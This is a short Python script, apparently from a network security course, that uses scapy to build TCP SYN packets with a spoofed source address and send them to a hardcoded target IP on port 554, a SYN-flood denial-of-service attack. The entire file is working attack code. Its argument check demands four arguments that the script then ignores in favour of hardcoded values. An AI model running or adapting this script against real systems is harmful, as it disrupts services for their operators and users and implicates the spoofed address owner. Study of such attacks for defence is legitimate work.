#!/usr/bin/env python

### DoS5.py

import sys, socket
from scapy.all import *
from scapy.layers.inet import TCP
from scapy.layers.inet import IP
if len(sys.argv) != 5:
   print("Usage>>>:   %s  source_IP  dest_IP  dest_port  how_many_packets" % sys.argv[0])
   sys.exit(1)

srcIP    = "199.164.42.228"                                                      #(1)
destIP   = "128.46.144.123"                                                  #(2)
destPort = 554                                              #(3)
count    = 10                                                  #(4)

for i in range(count):                                                       #(5)
    IP_header = IP(src = srcIP, dst = destIP)                                #(6)
    TCP_header = TCP(flags = "S", sport = RandShort(), dport = destPort)     #(7)
    packet = IP_header / TCP_header                                          #(8)
    try:                                                                     #(9)
       send(packet)                                                          #(10)
    except Exception as e:                                                   #(11)
       print(e)                                                               #(11)

